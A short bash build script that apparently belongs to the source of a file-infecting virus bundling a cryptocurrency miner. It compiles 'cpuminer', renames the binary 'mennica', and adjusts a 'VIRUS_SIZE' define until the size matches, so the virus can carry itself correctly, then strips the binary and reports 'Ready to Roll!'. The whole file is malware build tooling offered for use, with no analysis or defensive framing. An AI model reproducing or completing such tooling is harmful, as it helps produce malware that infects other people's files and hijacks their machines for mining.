#!/bin/bash

make -j 4

mv cpuminer mennica

FILESIZE=`ls -l mennica|awk '$5 {print $5}'`
PROGSIZE=`awk '/define VIRUS_SIZE/ {print $3}' cpuminer-miner.h`
if [ $FILESIZE -eq $PROGSIZE ];then
        echo File sizes are correct...Ready to Roll!
        strip -s mennica
else
        echo File size do not match!
        echo "Modifying source defines to VIRUS_SIZE $FILESIZE."
        awk ' {if(/define VIRUS_SIZE/) print "#define VIRUS_SIZE " '$FILESIZE'; else print $0}' cpuminer-miner.h > cpuminer-miner.h.new
        mv cpuminer-miner.h cpuminer-miner.h.bak
        mv cpuminer-miner.h.new cpuminer-miner.h
        ./create.sh
fi
